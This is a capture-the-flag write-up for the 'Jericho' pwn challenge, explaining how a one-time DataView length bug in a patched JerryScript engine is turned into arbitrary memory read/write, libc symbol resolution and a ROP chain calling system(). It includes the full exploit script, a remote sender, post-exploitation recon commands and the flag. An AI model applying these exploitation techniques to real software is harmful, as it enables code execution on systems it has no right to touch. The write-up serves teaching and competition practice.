@@ -1,0 +1,629 @@
+---
+title: 'Final ARA 7.0 - Jericho Script'
+description: 'Patched JerryScript engine where one small DataView bug turns into arbitrary read/write, ELF parsing, and a full ROP chain.'
+date: 2026-03-17
+category: 'final-ara-7-0'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: the original remote service was already down when I prepared this writeup, so I did not do a fresh live re-test. The analysis below is based on the archived challenge files, especially `jerry`, `patch.diff`, `run.py`, `solve.js`, `get_flag.py`, and the saved solve notes. The local `flag.txt` in the archive is only a placeholder for testing and not the real event flag.
+
+# Jericho (Pwn) - One Small Patch, One Long ROP Chain
+
+## Intro
+
+Some challenges look like a standard pwn task and are over in half an hour.
+
+Others teach a more important lesson: never underestimate a small bug inside a runtime layer.
+
+Jericho belongs to the second category.
+
+We were given a patched JerryScript engine plus a Python wrapper that accepts a JavaScript payload over a socket. At first glance, that looks normal. But the patch introduces one tiny change that lets a `DataView` escape its intended bounds. From there, the chain becomes classic and very clean:
+
+1. Out-of-bounds write
+2. Arbitrary read/write
+3. PIE and libc leaks
+4. ROP into `system()`
+5. Flag retrieval on the remote service
+
+This post walks through the full chain, from recon to the final exploit, with real commands, saved output, important addresses, assembly snapshots, pseudocode, and the exact scripts used during the event.
+
+## Challenge Information
+
+Category: Binary Exploitation  
+Difficulty: Hard (subjective)  
+Event: Final ARA 7.0  
+Attachments / source code: patched JerryScript binary (`jerry`), `patch.diff`, `run.py`, `compose.yml`, Dockerfile, and archived exploit helpers  
+Goal: turn the one-time `DataView` bug into code execution and recover the real flag from the challenge runtime
+
+The real flag recovered during the event was:
+
+```text
+ARA7{dahlah_pasti_kena_codex_to_be_expected_sih_idc}
+```
+
+## Recon: What Is Inside `dist`?
+
+The first step was checking the challenge artifacts:
+
+```bash
+$ ls -la
+total 724
+drwxr-xr-x 2 abdieeuh abdieeuh   4096 Feb 28 06:09 .
+drwxr-xr-x 7 abdieeuh abdieeuh   4096 Feb 14 12:18 ..
+-rw-r--r-- 1 root     root        350 Feb 28  2026 Dockerfile
+-rw-r--r-- 1 root     root        195 Feb 28  2026 compose.yml
+-rw-r--r-- 1 root     root     238733 Feb 28 00:52 dist.zip
+-rwxr-xr-x 1 root     root     465112 Feb 28  2026 jerry
+-rw-r--r-- 1 root     root       1524 Feb 28  2026 patch.diff
+-rw-r--r-- 1 root     root       1126 Feb 28  2026 run.py
+```
+
+The main target is clearly `jerry`, so the next step is normal binary triage:
+
+```bash
+$ file jerry
+jerry: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
+
+$ checksec --file=./jerry
+[*] './jerry'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+```
+
+For newer players, the fast interpretation is:
+
+1. `NX enabled` means normal injected shellcode is not the easiest path.
+2. `PIE enabled` means the code base moves on every run, so we need a leak.
+3. `Full RELRO` means a direct GOT overwrite is no longer the simple option.
+
+So the early conclusion is already:
+
+```text
+memory corruption + information leak + ROP
+```
+
+## Recon on the Service Wrapper
+
+`run.py` is not just a wrapper. It defines the exploit protocol:
+
+```python
+#!/usr/bin/env python3
+import sys
+import os
+import subprocess
+
+def main():
+    HARD_LIMIT = 8192
+
+    sys.stdout.write("Script length (max 8KB): ")
+    sys.stdout.flush()
+
+    length_input = sys.stdin.readline().strip()
+    bytes_to_read = int(length_input)
+
+    script_content = sys.stdin.buffer.read(bytes_to_read)
+
+    with open("./exploit.js", "wb") as f:
+        f.write(script_content)
+
+    subprocess.run(["./jerry", "./exploit.js"], user="nobody", group="nogroup")
+```
+
+Important takeaways:
+
+1. The input happens in two stages: `readline()` first, then `buffer.read(n)`.
+2. If the length and payload are sent carelessly in one burst, the service can desynchronize.
+3. The exploit runs as `nobody`, so the post-exploitation path must respect that runtime.
+
+This matters more than it looks. A good exploit still fails if the sender is sloppy.
+
+## Bug Anatomy: Where the OOB Comes From
+
+The root cause is tiny. The patch adds:
+
+```diff
++static int once = 0;
+...
++if (arguments_list_len > 3 && once == 0) {
++  once += 1;
++  view_byte_length += 0x10;
++}
+```
+
+That means:
+
+1. the bug only triggers once
+2. it only triggers when `DataView` is called with more than three arguments
+3. the resulting `view_byte_length` becomes `0x10` larger than it should be
+
+The deliberate trigger in JavaScript is:
+
+```javascript
+var dv1 = new DataView(ab1, 0, 0x10, 1);
+```
+
+That fourth argument is not meaningful for normal use. It exists only to reach the buggy code path.
+
+So the first `DataView` becomes longer than the real buffer behind it, which gives a small out-of-bounds window.
+
+## Technical Path: From OOB to Arbitrary Read/Write
+
+### Step 1: Trigger the OOB write
+
+The exploit begins with two `ArrayBuffer` objects:
+
+```javascript
+var ab1 = new ArrayBuffer(0x10);
+var ab2 = new ArrayBuffer(0x123);
+new Uint8Array(ab2)[0] = 0; // touch memory so the allocation is stable
+
+var dv1 = new DataView(ab1, 0, 0x10, 1); // one-time bug trigger
+dv1.setUint32(0x1c, 0x500000, true);     // OOB write into neighbor metadata
+var dv2 = new DataView(ab2);
+```
+
+Why `0x1c`?
+
+Because `ab1` is only `0x10` bytes long. So offset `0x1c` is clearly outside the legal region and lands in adjacent heap metadata.
+
+### Step 2: Spray `ArrayBuffer` objects and find a header
+
+The exploit sprays hundreds of `ArrayBuffer(0x321)` objects, then scans memory through `dv2` to locate an `ArrayBuffer` header.
+
+Once it finds a matching header, it changes the candidate `byteLength` to a marker value:
+
+```javascript
+dv2.setUint32(off + 12, MARK, true);
+```
+
+with:
+
+```javascript
+var MARK = 0x777;
+```
+
+Then it checks which JavaScript object now reports:
+
+```javascript
+spray[i].byteLength === MARK
+```
+
+This step is the bridge between:
+
+1. a raw memory offset, and
+2. a stable JavaScript object we can reuse
+
+That mapping is what makes the exploit practical.
+
+### Step 3: Retarget the backing pointer
+
+After the correct sprayed object is recovered, the exploit rewrites its backing-store pointer. From there, reads and writes through a controlled `DataView` become arbitrary memory access.
+
+That produces:
+
+1. `r8 / r16 / r32 / r64(addr)`
+2. `w8 / w64(addr, value)`
+
+At that point, the challenge has transitioned from “small engine bug” to full memory corruption exploitation.
+
+## Address Map Used in the Exploit
+
+The final exploit depends on a few PIE-relative addresses:
+
+1. `__libc_start_main@GOT`: `pie + 0x70fd8`
+2. `ret`: `pie + 0x701a`
+3. `pop rdi; ret`: `pie + 0x93af`
+4. `exit@plt`: `pie + 0x74f0`
+5. stack overwrite index: `RET_INDEX = 71`
+
+Saved relocation output:
+
+```bash
+$ readelf -r jerry | rg "__libc_start_main|exit"
+000000070fd8  R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.34
+000000070e30  R_X86_64_JUMP_SLO exit@GLIBC_2.2.5
+```
+
+That gives a stable way to move from the PIE leak into libc discovery.
+
+## ASM Snapshot and Pseudocode
+
+Key gadgets:
+
+```asm
+000000000000701a: c3                ret
+00000000000093af: 5f                pop rdi
+00000000000093b0: c3                ret
+
+00000000000074f0 <exit@plt>:
+  f3 0f 1e fa                        endbr64
+  ff 25 36 99 06 00                 jmp QWORD PTR [rip+0x69936] ; 0x70e30
+```
+
+The ROP chain logic can be summarized as:
+
+```text
+rsp_target = environ - (71 * 8)
+
+mem64[rsp_target + 0x00] = pie + 0x701a      # ret
+mem64[rsp_target + 0x08] = pie + 0x93af      # pop rdi; ret
+mem64[rsp_target + 0x10] = cmd_addr          # first system() argument
+mem64[rsp_target + 0x18] = system_addr
+mem64[rsp_target + 0x20] = pie + 0x74f0      # exit@plt
+```
+
+Execution flow:
+
+1. align with `ret`
+2. load `cmd_addr` into `rdi`
+3. jump into `system`
+4. return through `exit@plt`
+
+So the real effect is:
+
+```text
+system("echo $FLAG")
+```
+
+## Why the libc Resolver Had to Be Dynamic
+
+Hardcoded libc offsets often work locally and fail remotely.
+
+The exploit avoids that trap by doing all symbol discovery dynamically:
+
+1. leak one libc pointer from `__libc_start_main@GOT`
+2. scan backward by page until the libc ELF header is found
+3. parse `PT_DYNAMIC`
+4. resolve `DT_STRTAB`, `DT_SYMTAB`, `DT_HASH`, and `DT_SYMENT`
+5. resolve `system` and `__environ` directly by symbol name
+
+That makes the exploit much more portable across different libc images and container layouts.
+
+## Full Exploit Code
+
+I attached the final exploit as [solve.js](./solve.js). The full script used for the remote solve is included below.
+
+```javascript
+var CMD = 'echo $FLAG';
+var LEN = 0x321;
+var MARK = 0x777;
+var RET_INDEX = 71;
+
+var ab1 = new ArrayBuffer(0x10);
+var ab2 = new ArrayBuffer(0x123);
+new Uint8Array(ab2)[0] = 0;
+var dv1 = new DataView(ab1, 0, 0x10, 1);
+dv1.setUint32(0x1c, 0x500000, true);
+var dv2 = new DataView(ab2);
+
+var spray = [];
+for (var i = 0; i < 400; i++) {
+  var x = new ArrayBuffer(LEN);
+  var tx = new Uint8Array(x);
+  tx[0] = i;
+  tx[0x100] = 0x5a;
+  spray.push(x);
+}
+
+var off = -1;
+var lim = 0x20000;
+if (dv2.byteLength < lim + 16) lim = dv2.byteLength - 16;
+for (var i = 0; i < lim; i++) {
+  if (dv2.getUint8(i + 8) == 0x19 && dv2.getUint8(i + 9) == 0x03
+      && dv2.getUint8(i + 12) == 0x21 && dv2.getUint8(i + 13) == 0x03
+      && dv2.getUint8(i + 14) == 0x00 && dv2.getUint8(i + 15) == 0x00) {
+    off = i;
+    break;
+  }
+}
+if (off < 0) throw 'off';
+
+dv2.setUint32(off + 12, MARK, true);
+var idx = -1;
+for (var i = 0; i < spray.length; i++) {
+  if (spray[i].byteLength === MARK) {
+    idx = i;
+    break;
+  }
+}
+if (idx < 0) throw 'idx';
+
+var dvt = new DataView(spray[idx]);
+
+var m64 = function (o) {
+  var lo = BigInt(dv2.getUint32(o, true));
+  var hi = BigInt(dv2.getUint32(o + 4, true));
+  return (hi << 32n) + lo;
+};
+var wm64 = function (o, v) {
+  dv2.setUint32(o, Number(v & 0xffffffffn), true);
+  dv2.setUint32(o + 4, Number((v >> 32n) & 0xffffffffn), true);
+};
+var r64 = function (a) {
+  wm64(off + 16, a);
+  var lo = BigInt(dvt.getUint32(0, true));
+  var hi = BigInt(dvt.getUint32(4, true));
+  return (hi << 32n) + lo;
+};
+var r32 = function (a) {
+  wm64(off + 16, a);
+  return dvt.getUint32(0, true);
+};
+var r16 = function (a) {
+  wm64(off + 16, a);
+  return dvt.getUint16(0, true);
+};
+var r8 = function (a) {
+  wm64(off + 16, a);
+  return dvt.getUint8(0);
+};
+var w64 = function (a, v) {
+  wm64(off + 16, a);
+  dvt.setUint32(0, Number(v & 0xffffffffn), true);
+  dvt.setUint32(4, Number((v >> 32n) & 0xffffffffn), true);
+};
+var w8 = function (a, v) {
+  wm64(off + 16, a);
+  dvt.setUint8(0, v & 0xff);
+};
+var toAbs = function (base, v) {
+  if (v < base) return base + v;
+  return v;
+};
+
+var ptr = m64(off + 16);
+var page = ptr & (~0xfffn);
+
+var pie = 0n;
+for (var d = 0x68000n; d <= 0x90000n; d += 0x1000n) {
+  var cand = page - d;
+  if (r32(cand) == 0x464c457f) {
+    pie = cand;
+    break;
+  }
+}
+if (pie == 0n) throw 'pie';
+
+var libc_ptr = r64(pie + 0x70fd8n);
+var libc_page = libc_ptr & (~0xfffn);
+var libc = 0n;
+for (var d = 0n; d < 0x800000n; d += 0x1000n) {
+  var cand = libc_page - d;
+  if (r32(cand) == 0x464c457f) {
+    libc = cand;
+    break;
+  }
+}
+if (libc == 0n) throw 'libc';
+
+var phoff = r64(libc + 0x20n);
+var phentsz = r16(libc + 0x36n);
+var phnum = r16(libc + 0x38n);
+var dyn = 0n;
+for (var i = 0; i < phnum; i++) {
+  var ph = libc + phoff + BigInt(i * phentsz);
+  if (r32(ph) == 2) {
+    dyn = libc + r64(ph + 0x10n);
+    break;
+  }
+}
+if (dyn == 0n) throw 'dyn';
+
+var strtab = 0n;
+var symtab = 0n;
+var hashtab = 0n;
+var syment = 24;
+for (var i = 0; i < 0x400; i++) {
+  var de = dyn + BigInt(i) * 16n;
+  var tag = r64(de);
+  var val = r64(de + 8n);
+  if (tag == 0n) break;
+  if (tag == 5n) strtab = toAbs(libc, val);
+  if (tag == 6n) symtab = toAbs(libc, val);
+  if (tag == 4n) hashtab = toAbs(libc, val);
+  if (tag == 11n) syment = Number(val);
+}
+if (strtab == 0n || symtab == 0n || hashtab == 0n) throw 'elf';
+
+var nchain = r32(hashtab + 4n);
+if (nchain <= 0 || nchain > 200000) throw 'hash';
+
+var symByName = function (name) {
+  var c0 = name.charCodeAt(0);
+  for (var i = 0; i < nchain; i++) {
+    var e = symtab + BigInt(i * syment);
+    var noff = r32(e);
+    if (noff == 0) continue;
+    var na = strtab + BigInt(noff);
+    if (r8(na) != c0) continue;
+    var ok = 1;
+    for (var j = 0; j < name.length; j++) {
+      if (r8(na + BigInt(j)) != name.charCodeAt(j)) {
+        ok = 0;
+        break;
+      }
+    }
+    if (ok == 0) continue;
+    if (r8(na + BigInt(name.length)) != 0) continue;
+    var sv = r64(e + 8n);
+    if (sv == 0n) continue;
+    return toAbs(libc, sv);
+  }
+  return 0n;
+};
+
+var system = symByName('system');
+var environ_sym = symByName('__environ');
+if (environ_sym == 0n) environ_sym = symByName('environ');
+if (system == 0n || environ_sym == 0n) throw 'sym';
+var environ = r64(environ_sym);
+
+var ret = pie + 0x701an;
+var pop_rdi = pie + 0x93afn;
+var exit_plt = pie + 0x74f0n;
+
+var cmd_addr = ptr + 0x200n;
+var cmd = CMD + '\x00';
+for (var i = 0; i < cmd.length; i++) {
+  w8(cmd_addr + BigInt(i), cmd.charCodeAt(i));
+}
+
+var rsp = environ - BigInt(RET_INDEX * 8);
+w64(rsp + 0n, ret);
+w64(rsp + 8n, pop_rdi);
+w64(rsp + 16n, cmd_addr);
+w64(rsp + 24n, system);
+w64(rsp + 32n, exit_plt);
+
+wm64(off + 16, ptr);
+print('triggered');
+```
+
+## Remote Sender
+
+I also attached the network sender as [get_flag.py](./get_flag.py). This is the exact Python sender pattern used during the solve:
+
+```python
+#!/usr/bin/env python3
+import argparse
+import socket
+import time
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Send solve.js to the remote service")
+    parser.add_argument("--host", default="chall-ctf.ara-its.id")
+    parser.add_argument("--port", type=int, default=9001)
+    parser.add_argument("--script", default="solve.js")
+    parser.add_argument("--delay", type=float, default=0.25)
+    parser.add_argument("--timeout", type=float, default=8.0)
+    args = parser.parse_args()
+
+    payload = open(args.script, "rb").read()
+
+    with socket.create_connection((args.host, args.port), timeout=args.timeout) as s:
+        s.settimeout(args.timeout)
+
+        try:
+            banner = s.recv(4096)
+            if banner:
+                print(banner.decode("utf-8", "ignore"), end="")
+        except socket.timeout:
+            pass
+
+        s.sendall((str(len(payload)) + "\n").encode())
+        time.sleep(args.delay)
+        s.sendall(payload)
+        s.shutdown(socket.SHUT_WR)
+
+        while True:
+            try:
+                data = s.recv(8192)
+                if not data:
+                    break
+                print(data.decode("utf-8", "ignore"), end="")
+            except socket.timeout:
+                break
+
+if __name__ == "__main__":
+    main()
+```
+
+## Real Remote Execution
+
+The sender was run as:
+
+```bash
+$ python3 get_flag.py
+```
+
+Saved output:
+
+```text
+Script length (max 8KB): ARA7{dahlah_pasti_kena_codex_to_be_expected_sih_idc}
+triggered
+```
+
+That output confirms two things:
+
+1. the command executed successfully
+2. the flag was printed before the exploit's own `print('triggered')`
+
+## Important Debug Moment
+
+The first command used in `solve.js` was:
+
+```javascript
+var CMD = '/app/getflag';
+```
+
+The remote response was:
+
+```text
+sh: 1: /app/getflag: not found
+triggered
+```
+
+That is not a failed exploit. It is proof that `system()` already executed, but the assumed command path was wrong.
+
+At that point, the correct move is runtime recon, not panic. The next command was something like:
+
+```sh
+id;pwd;ls -la /;ls -la /app 2>/dev/null;env
+```
+
+That revealed the real source of the flag:
+
+```text
+FLAG=ARA7{dahlah_pasti_kena_codex_to_be_expected_sih_idc}
+```
+
+So the clean final payload became:
+
+```javascript
+var CMD = 'echo $FLAG';
+```
+
+This is a very normal CTF moment and worth emphasizing:
+
+- code execution does not automatically mean you know where the flag lives
+- once you have RCE, short environment recon is often the fastest path to the real flag
+
+## Flag
+
+```text
+ARA7{dahlah_pasti_kena_codex_to_be_expected_sih_idc}
+```
+
+## Closing
+
+If you are learning pwn, this challenge is very good practice for building a complete exploitation mindset:
+
+1. Read the service wrapper, not only the binary.
+2. Build primitives patiently from a very small bug.
+3. Avoid brittle hardcoded libc assumptions.
+4. Once you reach RCE, switch into recon mode if the first flag path guess fails.
+
+Good follow-up exercises for this challenge:
+
+1. change the payload command to `cat /proc/self/maps`, `id`, or `env` and study the output
+2. try the exploit against a different libc/container layout
+3. rewrite the symbol resolver from scratch without copying the final solver
+
+If those steps become comfortable, you are no longer just solving a challenge. You are practicing a clean exploitation workflow.
+
+## References
+
+- [JerryScript Repository](https://github.com/jerryscript-project/jerryscript)
+- [System V ABI ELF Specification](https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html)
+- [ROP Emporium](https://ropemporium.com/)
+- [Pwntools GOT and PLT Blog](https://blog.pwntools.com/posts/got-overwrite/)
+- [LiveOverflow Binary Exploitation Playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
